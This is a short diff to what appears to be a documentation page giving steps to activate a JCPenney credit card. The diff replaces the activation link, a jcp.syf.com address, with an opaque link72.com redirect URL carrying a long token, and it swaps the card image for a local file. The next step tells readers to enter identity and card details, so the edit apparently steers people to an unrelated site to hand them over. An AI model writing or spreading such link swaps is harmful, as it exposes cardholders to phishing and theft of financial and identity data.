@@ -27,7 +27,7 @@ Steps to Activate
 
 1. Visit the JCPenney Credit Card activation page:
 
-   https://jcp.syf.com/activate
+  https://link72.com/?CqqyiIcugtWlBrSDPObcml9L9tt894FGFHYcCgHhno0e35ViZlpj0P1xTUx0xSCq8q
 
 2. Enter the required details related to your identity and your new credit card.
 
@@ -45,7 +45,7 @@ Why Activate Your Card?
 .. raw:: html
 
    <div style="margin: 30px 0; text-align: center;">
-     <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/JCPenney_Credit_Card.png"
+     <img src="jcpenny.jpg"
           alt="JCPenney Credit Card"
           style="max-width: 100%; height: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.15);">
    </div>
